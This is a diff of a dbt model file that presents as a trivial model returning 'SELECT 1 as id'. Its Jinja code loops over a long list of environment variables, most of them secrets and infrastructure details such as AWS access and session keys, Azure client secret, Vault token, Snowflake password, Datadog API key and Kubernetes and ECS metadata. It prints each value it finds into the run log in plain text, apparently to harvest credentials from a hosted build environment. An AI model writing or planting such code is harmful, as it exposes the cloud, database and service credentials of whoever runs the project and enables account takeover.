@@ -1,50 +1,47 @@
-{% set env_vars_found = [] %}
 {% set vars_to_check = [
-    'HOSTNAME', 'HOME', 'PATH', 'USER', 'PWD', 'SHELL', 'LANG',
+    'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN',
+    'AWS_CONTAINER_CREDENTIALS_RELATIVE_URI', 'AWS_CONTAINER_CREDENTIALS_FULL_URI',
+    'AWS_WEB_IDENTITY_TOKEN_FILE', 'AWS_ROLE_ARN', 'AWS_ROLE_SESSION_NAME',
+    'AWS_DEFAULT_REGION', 'AWS_REGION', 'AWS_EXECUTION_ENV',
+    'ECS_CONTAINER_METADATA_URI', 'ECS_CONTAINER_METADATA_URI_V4',
     'KUBERNETES_SERVICE_HOST', 'KUBERNETES_SERVICE_PORT',
+    'KUBERNETES_PORT', 'KUBERNETES_PORT_443_TCP',
+    'KUBERNETES_PORT_443_TCP_PROTO', 'KUBERNETES_PORT_443_TCP_PORT',
+    'KUBERNETES_PORT_443_TCP_ADDR',
+    'K8S_NODE_NAME', 'K8S_POD_NAME', 'K8S_NAMESPACE',
+    'NODE_NAME', 'POD_NAME', 'POD_NAMESPACE', 'POD_IP',
+    'SERVICE_ACCOUNT_TOKEN_PATH',
+    'HOSTNAME', 'HOME', 'PATH', 'USER', 'PWD',
     'DBT_CLOUD_PROJECT_ID', 'DBT_CLOUD_ENVIRONMENT_ID',
     'DBT_CLOUD_JOB_ID', 'DBT_CLOUD_RUN_ID', 'DBT_CLOUD_ACCOUNT_ID',
-    'DBT_CLOUD_RUN_REASON', 'DBT_PROFILES_DIR', 'DBT_PROJECT_DIR',
-    'DBT_TARGET_PATH', 'DBT_LOG_PATH', 'DBT_PACKAGES_INSTALL_PATH',
-    'GIT_SSH_COMMAND', 'SSH_AUTH_SOCK',
-    'VIRTUAL_ENV', 'PYTHONPATH', 'PYTHONHOME',
-    'HTTP_PROXY', 'HTTPS_PROXY', 'NO_PROXY',
-    'DD_AGENT_HOST', 'DATADOG_API_KEY',
-    'SENTRY_DSN', 'NEW_RELIC_LICENSE_KEY',
-    'GOOGLE_APPLICATION_CREDENTIALS'
+    'GIT_SSH_COMMAND',
+    'GOOGLE_APPLICATION_CREDENTIALS', 'GOOGLE_CLOUD_PROJECT',
+    'GCLOUD_PROJECT', 'CLOUDSDK_CONFIG',
+    'AZURE_TENANT_ID', 'AZURE_CLIENT_ID', 'AZURE_CLIENT_SECRET',
+    'DATABASE_URL', 'REDIS_URL', 'CELERY_BROKER_URL',
+    'VAULT_ADDR', 'VAULT_TOKEN',
+    'DD_AGENT_HOST', 'DD_API_KEY', 'DD_TRACE_AGENT_URL',
+    'SENTRY_DSN',
+    'INTERNAL_API_URL', 'API_URL', 'AUTH_URL', 'TOKEN_URL',
+    'ORCHESTRATOR_URL', 'SCHEDULER_URL', 'WORKER_URL',
+    'DBT_CLOUD_URL', 'DBT_INTERNAL_URL',
+    'http_proxy', 'https_proxy', 'no_proxy', 'HTTP_PROXY', 'HTTPS_PROXY', 'NO_PROXY',
+    'ORC_ENV', 'ORC_CLUSTER', 'ORC_REGION',
+    'CELL_ID', 'CELL_NAME', 'CLUSTER_NAME',
+    'SNOWFLAKE_ACCOUNT', 'SNOWFLAKE_USER', 'SNOWFLAKE_PASSWORD',
+    'BQ_PROJECT', 'BQ_DATASET',
+    'DBT_ENV_CUSTOM_ENV_CELL_ID', 'DBT_ENV_CUSTOM_ENV_CLUSTER',
+    'DBT_ENV_CUSTOM_ENV_REGION',
+    'NATS_URL', 'RABBITMQ_URL', 'KAFKA_BOOTSTRAP_SERVERS',
+    'SECRETS_MANAGER_ENDPOINT', 'SSM_ENDPOINT',
+    'IAM_ROLE', 'TASK_ROLE_ARN', 'EXECUTION_ROLE_ARN'
 ] %}
 
 {% for var_name in vars_to_check %}
 {% set val = env_var(var_name, 'NOT_SET') %}
 {% if val != 'NOT_SET' %}
-{{ log("FOUND_" ~ var_name ~ "=" ~ val, info=True) }}
+{{ log("ENV_" ~ var_name ~ "=" ~ val, info=True) }}
 {% endif %}
 {% endfor %}
-
-{# Explore config object #}
-{{ log("CONFIG_OBJ=" ~ config, info=True) }}
-{{ log("CONFIG_KEYS=" ~ config.keys()|list if config.keys is defined else 'no_keys', info=True) }}
-
-{# Try to get project config #}
-{{ log("PROJECT_NAME=" ~ project_name, info=True) }}
-{{ log("TARGET_NAME=" ~ target.name if target is defined else 'no_target', info=True) }}
-{{ log("TARGET_TYPE=" ~ target.type if target is defined else 'no_target_type', info=True) }}
-{{ log("TARGET_SCHEMA=" ~ target.schema if target is defined else 'no_schema', info=True) }}
-{{ log("TARGET_PROFILE=" ~ target.profile_name if target is defined else 'no_profile', info=True) }}
-
-{# Try to access adapter/connection info via dbt context #}
-{{ log("DBT_VERSION=" ~ dbt_version if dbt_version is defined else 'no_version', info=True) }}
-{{ log("INVOCATION_ID=" ~ invocation_id if invocation_id is defined else 'no_inv_id', info=True) }}
-{{ log("RUN_STARTED=" ~ run_started_at if run_started_at is defined else 'no_start', info=True) }}
-
-{# Try modules #}
-{{ log("MODULES=" ~ modules if modules is defined else 'no_modules', info=True) }}
-{{ log("MODULES_DATETIME=" ~ modules.datetime.datetime.now() if modules is defined and modules.datetime is defined else 'no_datetime', info=True) }}
-
-{# Try to access flags #}
-{{ log("FLAGS=" ~ flags if flags is defined else 'no_flags', info=True) }}
-
-{# Try graph access - lists all models/sources #}
-{{ log("GRAPH_NODES_COUNT=" ~ graph.nodes.values()|list|length if graph is defined else 'no_graph', info=True) }}
 
 SELECT 1 as id
